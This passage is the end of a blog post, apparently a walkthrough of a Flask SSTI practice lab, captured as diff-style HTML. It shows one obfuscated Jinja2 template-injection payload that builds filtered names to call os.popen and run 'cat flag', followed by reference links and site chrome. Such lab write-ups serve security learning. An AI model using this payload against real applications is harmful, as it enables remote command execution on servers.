+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop&#x3D;dict(pop&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class="line">&#123;% set globals&#x3D;(xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem&#x3D;(xiahuaxian,xiahuaxian,dict(getitem&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space&#x3D;(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class="line">&#123;% set os&#x3D;dict(os&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set popen&#x3D;dict(popen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cat&#x3D;dict(cat&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cmd&#x3D;(cat,space,dict(flag&#x3D;a)|join)|join%&#125;</span><br><span class="line">&#123;% set read&#x3D;dict(read&#x3D;a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9407" >GitHub SSTI靶场 wp<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645" >MAR &amp; DASCTF 2021 baby_flask<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.babyitellyou.com/details?id=603372874da5fa7d6084f89c" >CTFshow-WEB入门-SSTI<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Flask SSTI LAB攻略</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-05-06 16:01:47</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/05/06/Flask-SSTI-LAB攻略/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/04/14/XXE%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XXE总结</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Flask-SSTI-LAB%E6%94%BB%E7%95%A5"><span class="nav-text">Flask SSTI LAB攻略</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level-1"><span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-2"><span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-3"><span class="nav-text">level 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-4"><span class="nav-text">level 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-5"><span class="nav-text">level 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-6"><span class="nav-text">level 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-7"><span class="nav-text">level 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-8"><span class="nav-text">level 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-9"><span class="nav-text">level 9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-10"><span class="nav-text">level 10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-11"><span class="nav-text">level 11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-12"><span class="nav-text">level 12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-13"><span class="nav-text">level 13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
